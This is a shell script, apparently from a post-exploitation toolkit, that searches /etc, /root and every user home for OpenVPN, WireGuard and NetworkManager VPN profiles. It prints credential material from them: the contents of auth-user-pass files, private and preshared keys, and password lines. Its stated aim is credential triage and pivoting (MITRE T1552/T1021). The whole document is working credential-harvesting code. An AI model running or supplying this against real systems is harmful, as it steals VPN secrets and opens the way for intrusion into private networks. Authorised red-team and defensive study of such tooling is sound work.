#!/bin/sh
# gather/linux/enum-vpn-creds.sh — Enumerate VPN configs, credentials, and endpoint hints
# Requires: read access to /etc and user homes
# Read-only: YES
# MITRE ATT&CK: T1552 / T1021

homes() {
  cut -d: -f6 /etc/passwd 2>/dev/null | sort -u
}

echo "=== OBJECTIVE ==="
echo "Collect VPN configuration, credential references, and remote endpoint hints for pivot and credential triage."

echo ""
echo "=== OPENVPN_CONFIGS ==="
find /etc/openvpn /usr/local/etc/openvpn /home /root -maxdepth 4 \( -name '*.ovpn' -o -name '*.conf' \) 2>/dev/null | sort | while IFS= read -r f; do
  echo "--- $f ---"
  grep -nE '^(client|dev|proto|remote|auth-user-pass|pkcs12|ca |cert |key |tls-auth|tls-crypt)' "$f" 2>/dev/null
 done

echo ""
echo "=== OPENVPN_CREDENTIAL_REFERENCES ==="
find /etc/openvpn /usr/local/etc/openvpn /home /root -maxdepth 4 \( -name '*.ovpn' -o -name '*.conf' \) 2>/dev/null | sort | while IFS= read -r f; do
  auth_ref=$(awk '/^auth-user-pass[[:space:]]+/ {print $2}' "$f" 2>/dev/null)
  [ -n "$auth_ref" ] || continue
  echo "--- $f -> $auth_ref ---"
  if [ -f "$auth_ref" ]; then
    sed -n '1,20p' "$auth_ref" 2>/dev/null
  fi
 done

echo ""
echo "=== WIREGUARD_CONFIGS ==="
find /etc/wireguard /home /root -maxdepth 4 -name '*.conf' 2>/dev/null | sort | while IFS= read -r f; do
  echo "--- $f ---"
  grep -nE '^(\[Interface\]|\[Peer\]|Address|DNS|PrivateKey|PublicKey|PresharedKey|AllowedIPs|Endpoint|PersistentKeepalive)' "$f" 2>/dev/null
 done

echo ""
echo "=== NETWORKMANAGER_VPN_PROFILES ==="
find /etc/NetworkManager/system-connections /home /root -maxdepth 4 \( -name '*.nmconnection' -o -name '*.conf' \) 2>/dev/null | sort | while IFS= read -r f; do
  grep -qEi 'vpn|wireguard|openvpn' "$f" 2>/dev/null || continue
  echo "--- $f ---"
  grep -nEi '(^id=|^type=|^service-type=|gateway|remote|host|user(name)?=|cert|key|password)' "$f" 2>/dev/null
 done

echo ""
echo "=== USER_VPN_ARTIFACTS ==="
homes | while IFS= read -r d; do
  find "$d" -maxdepth 4 \( -iname '*openvpn*' -o -iname '*wireguard*' -o -name '*.ovpn' -o -path '*/.config/NetworkManager/*' \) 2>/dev/null | sort | while IFS= read -r f; do
    [ -f "$f" ] || continue
    echo "--- $f ---"
    grep -nEi 'remote|endpoint|gateway|auth-user-pass|user(name)?=|password|privatekey|presharedkey|cert|key' "$f" 2>/dev/null | head -80
  done
 done
